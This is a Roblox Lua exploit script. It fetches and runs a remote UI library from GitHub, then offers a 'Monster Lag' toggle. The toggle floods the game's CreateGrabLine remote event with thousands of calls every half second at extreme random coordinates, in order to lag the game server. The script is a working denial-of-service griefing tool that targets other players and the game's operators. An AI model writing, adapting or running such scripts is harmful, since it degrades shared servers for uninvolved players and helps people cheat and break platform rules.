local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "Server_Lag_Script"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/fleksmi-bot/Library2/refs/heads/main/Library1.lua"))()

local Window = Library:CreateWindow({
    Title = "Server Lag",
    Theme = "Night",
    ShowWatermark = { Enabled = true, Title = true, User = false, FPS = true, Duration = false, Ping = true, Time= false },
    ToggleKey = Enum.KeyCode.RightShift,
})

local ServerTab = Window:CreateTab("Server", true)
local ServerBlock = ServerTab:CreateBlock({Name = "Server Lag", Side = "Left"})

local RS = game:GetService("ReplicatedStorage")
local GrabEvents = RS:FindFirstChild("GrabEvents")
local CreateLine = GrabEvents and GrabEvents:FindFirstChild("CreateGrabLine")

-- ============ MONSTER LAG (из ХУЙ.FLING) ============
local monsterLagActive = false
local monsterLagTask = nil
local monsterLagPower = 1

ServerBlock:CreateSlider({
    Name = "Monster Lag Power (1-10)",
    Min = 1,
    Max = 10,
    Default = 1,
    Rounding = 0,
    Callback = function(Value)
        monsterLagPower = Value
    end
})

ServerBlock:CreateToggle({
    Name = "Monster Lag",
    Default = false,
    Callback = function(Value)
        monsterLagActive = Value
        
        if Value then
            local power = monsterLagPower
            local intensity = power * 1000
            
            Library:Notify({ 
                Title = "Monster Lag", 
                Content = "Enabled (Power: " .. power .. " | Intensity: " .. intensity .. ")", 
                Duration = 3 
            })
            
            monsterLagTask = task.spawn(function()
                local WS = game:GetService("Workspace")
                local LP = game:GetService("Players").LocalPlayer
                
                while monsterLagActive and CreateLine do
                    for _ = 1, intensity do
                        local spawnLocation = WS:FindFirstChild("SpawnLocation") 
                            or WS:FindFirstChild("Spawn") 
                            or (LP.Character and LP.Character:FindFirstChild("HumanoidRootPart"))
                        
                        if spawnLocation then
                            local randomX = math.random(-9e9, 9e9)
                            local randomZ = math.random(-9e9, 9e9)
                            CreateLine:FireServer(spawnLocation, CFrame.new(randomX, 0, randomZ))
                        end
                    end
                    task.wait(0.5)
                end
            end)
        else
            if monsterLagTask then
                task.cancel(monsterLagTask)
                monsterLagTask = nil
            end
            Library:Notify({ Title = "Monster Lag", Content = "Disabled", Duration = 2 })
        end
    end
})

Library:Notify({ Title = "Server Lag", Content = "Loaded!", Duration = 3 })
